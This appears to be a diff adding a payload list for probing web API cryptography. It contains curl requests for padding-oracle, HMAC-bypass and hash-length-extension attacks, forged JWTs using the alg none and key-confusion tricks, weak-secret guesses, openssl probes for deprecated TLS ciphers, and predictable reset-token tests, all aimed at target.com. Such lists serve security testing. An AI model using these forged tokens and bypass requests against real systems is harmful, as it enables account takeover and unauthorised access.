@@ -1,0 +1,35 @@
+curl -s https://target.com/api/decrypt -d '{"ciphertext":"AAAA...","iv":"0000000000000000"}' -H "Content-Type: application/json"
+curl -s https://target.com/api/decrypt -d '{"ciphertext":"AAAA...","iv":"0000000000000001"}' -H "Content-Type: application/json"
+{"padding": "PKCS7", "ciphertext": "AAAAAAAAAAAAAAAA", "iv": "00000000000000000000000000000000"}
+{"token": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=="}
+{"token": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="}
+MD5(password): 5f4dcc3b5aa765d61d8327deb882cf99
+SHA1(password): 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
+Hash: 098f6bcd4621d373cade4e832627b4f6 (md5 of "test")
+Hash: da39a3ee5e6b4b0d3255bfef95601890afd80709 (sha1 of "")
+curl -s https://target.com/api/sign -d '{"data":"admin","algorithm":"MD5"}' -H "Content-Type: application/json"
+curl -s https://target.com/api/verify -d '{"data":"payload","hmac":"0000000000000000000000000000000000000000000000000000000000000000"}' -H "Content-Type: application/json"
+{"jwt_secret": "secret"}
+{"jwt_secret": "password"}
+{"jwt_secret": ""}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
+eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9... (RS256 to HS256 confusion)
+openssl s_client -connect target.com:443 -ssl2
+openssl s_client -connect target.com:443 -ssl3
+openssl s_client -connect target.com:443 -tls1
+openssl s_client -connect target.com:443 -tls1_1
+openssl s_client -connect target.com:443 -cipher "RC4"
+openssl s_client -connect target.com:443 -cipher "DES"
+openssl s_client -connect target.com:443 -cipher "NULL"
+openssl s_client -connect target.com:443 -cipher "EXPORT"
+{"iv": "00000000000000000000000000000000", "data": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}
+{"iv": "00000000000000000000000000000000", "data": "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"}
+curl -s -X POST https://target.com/api/encrypt -d '{"data":"A"*16,"key":"AAAAAAAAAAAAAAAA"}' (ECB mode detection: identical blocks = identical ciphertext)
+{"data": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==", "mode": "ECB"}
+password reset token prediction: GET /api/reset?token=aaaa → aaab → aaac
+session token: check if sequential or time-based
+{"token": "1970-01-01T00:00:00Z:user@example.com"}
+{"signed_data": "user=admin", "signature": ""}
+{"signed_data": "user=admin", "signature": "0"}
+curl -s -X POST https://target.com/api/mac -d '{"data":"user=admin\x80...","mac":"valid_mac_of_user=regular"}' (hash length extension)
